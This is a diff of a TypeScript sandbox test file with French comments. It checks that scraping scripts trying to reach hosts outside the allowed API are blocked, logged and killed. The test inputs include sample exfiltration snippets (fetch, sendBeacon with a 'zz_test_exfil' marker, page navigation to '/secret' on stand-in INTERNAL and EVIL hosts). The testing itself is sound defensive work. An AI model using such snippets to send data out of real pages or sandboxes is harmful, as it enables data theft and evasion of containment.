@@ -23,7 +23,7 @@ type Logger = Parameters<typeof runScriptExecutor>[0]['logger'];
 import { startClient, type Client } from '../../fixtures/src/test-helpers.ts';
 // Paquets construits, comme le worker : mêmes classes (erreurs de garde, DslError) des deux côtés.
 import { DomainPacer, Secret, validateDeclarativeSpec, validateOutput, type DeclarativeSpec } from '@runtime/core';
-import { domainRequestPacer, runFetchExecutor, type DeclarativeRunResult, type ExecFailure, type HttpExchange, type RequestPacer } from '@runtime/core/exec';
+import { domainRequestPacer, failureRoute, runFetchExecutor, type DeclarativeRunResult, type ExecFailure, type HttpExchange, type RequestPacer } from '@runtime/core/exec';
 import * as net from '@runtime/core/net';
 import {
   openBrowserEgress,
@@ -451,7 +451,6 @@ describe('E3 en script dans le bac à sable (1.5) : ctx.page.*, ctx.fetch, ctx.e
     ['fetch attendu', `await ctx.page.evaluate((u) => fetch(u).then(() => 'ok', () => 'blocked'), INTERNAL_URL);`],
     ['fetch lâché', `await ctx.page.evaluate((u) => { fetch(u).catch(() => {}); return 1; }, INTERNAL_URL); await new Promise(() => {});`],
     ['image et sendBeacon', `await ctx.page.evaluate((u) => { new Image().src = u; navigator.sendBeacon(u, 'zz_test_exfil'); return 1; }, INTERNAL_URL); await new Promise(() => {});`],
-    ['navigation de la page', `await ctx.page.evaluate((u) => { location.href = u; return 1; }, INTERNAL_URL); await new Promise(() => {});`],
     ['ctx.page.goto', `await ctx.page.goto(INTERNAL_URL);`],
   ])('assert_sandbox (ctx.page, D-29) : %s vers un domaine hors API → sandbox_violation, 0 requête, enfant tué en < 2 s', async (_name, body) => {
     logged.length = 0;
@@ -461,6 +460,26 @@ describe('E3 en script dans le bac à sable (1.5) : ctx.page.*, ctx.fetch, ctx.e
     });
     expect(out.result).toMatchObject({ ok: false, failure: { failure_class: 'code_error', detail: 'sandbox_violation' } });
     expect(out.violations.map((v) => v.reason)).toContain('domain_not_allowed');
+    expect(out.violations.find((v) => v.reason === 'domain_not_allowed')?.detail).toBe(INTERNAL);
+    expect(out.killed).toBe(true);
+    expect(out.killLatencyMs ?? Number.POSITIVE_INFINITY).toBeLessThan(2_000);
+    expect(Date.now() - started).toBeLessThan(15_000);
+    expect(logged.some((l) => l.event === 'sandbox_violation' && l.reason === 'domain_not_allowed')).toBe(true);
+    expect((await client.stats()).hosts[INTERNAL]?.total ?? 0).toBe(0);
+    expect(pool.active()).toBe(0);
+  }, 60_000);
+
+  // Revue de 1.7 (INV6) : une navigation du cadre principal pendant un evaluate peut venir du code du script comme d'un défi
+  // muet de la page ; la tentative reste une violation (journalisée, enfant tué, 0 requête : D-29), mais la classe est
+  // celle d'une navigation non demandée (refus, aucune réparation), jamais code_error.
+  test('assert_sandbox (ctx.page, D-29) : navigation de la page vers un domaine hors API pendant un evaluate → sandbox_violation journalisée, 0 requête, enfant tué en < 2 s ; classe blocked_by_protection (self_navigation), jamais de réparation', async () => {
+    logged.length = 0;
+    const started = Date.now();
+    const out = await script(`const INTERNAL_URL = input.url;\nawait ctx.page.evaluate((u) => { location.href = u; return 1; }, INTERNAL_URL); await new Promise(() => {});\nctx.emit({ title: 'jamais', price: 1 });`, {
+      input: { url: `${base(INTERNAL)}/secret?zz_test_exfil=1` },
+    });
+    expect(out.result).toMatchObject({ ok: false, failure: { failure_class: 'blocked_by_protection', detail: 'self_navigation' } });
+    expect(failureRoute((out.result as { failure: ExecFailure }).failure.failure_class).agent).toBe(false);
     expect(out.violations.find((v) => v.reason === 'domain_not_allowed')?.detail).toBe(INTERNAL);
     expect(out.killed).toBe(true);
     expect(out.killLatencyMs ?? Number.POSITIVE_INFINITY).toBeLessThan(2_000);
@@ -756,6 +775,24 @@ describe('E3 en script dans le bac à sable (1.5) : ctx.page.*, ctx.fetch, ctx.e
     await client.control({ op: 'site', site: 'challenge_200', variant: 'offsite' });
     const out = await script(`${waitProduct}${firstProduct}`, { allowedHosts: [CHALLENGE_200], startUrl: `${base(CHALLENGE_200)}/` });
     expect(out.result).toMatchObject({ ok: false, failure: { failure_class: 'blocked_by_protection', detail: 'self_navigation' } });
+    expect(out.items).toEqual([]);
+    expect((await client.stats()).hosts[EVIL]?.total ?? 0).toBe(0);
+  }, 60_000);
+
+  test('assert_no_circumvention (E3 script, revue de 1.7) : défi muet qui envoie le cadre principal vers un hôte hors API PENDANT un ctx.page.evaluate → blocked_by_protection (self_navigation), jamais code_error ni réparation ; violation journalisée, enfant tué, 0 requête vers cet hôte', async () => {
+    await client.control({ op: 'site', site: 'challenge_200', variant: 'offsite' });
+    await client.control({ op: 'site', site: 'challenge_200', resolve_after_ms: 1_000 });
+    logged.length = 0;
+    const out = await script(`await ctx.page.evaluate(() => new Promise((r) => setTimeout(() => r(1), 5000))).catch(() => null);\n${waitProduct}${firstProduct}`, {
+      allowedHosts: [CHALLENGE_200],
+      startUrl: `${base(CHALLENGE_200)}/`,
+    });
+    expect(out.result).toMatchObject({ ok: false, failure: { failure_class: 'blocked_by_protection', detail: 'self_navigation' } });
+    expect(failureRoute((out.result as { failure: ExecFailure }).failure.failure_class).agent).toBe(false);
+    // La navigation est bien partie PENDANT l'evaluate : imputée au guet (violation journalisée, D-29), enfant tué.
+    expect(out.violations.find((v) => v.reason === 'domain_not_allowed')?.detail).toBe(EVIL);
+    expect(logged.some((l) => l.event === 'sandbox_violation' && l.reason === 'domain_not_allowed')).toBe(true);
+    expect(out.killed).toBe(true);
     expect(out.items).toEqual([]);
     expect((await client.stats()).hosts[EVIL]?.total ?? 0).toBe(0);
   }, 60_000);
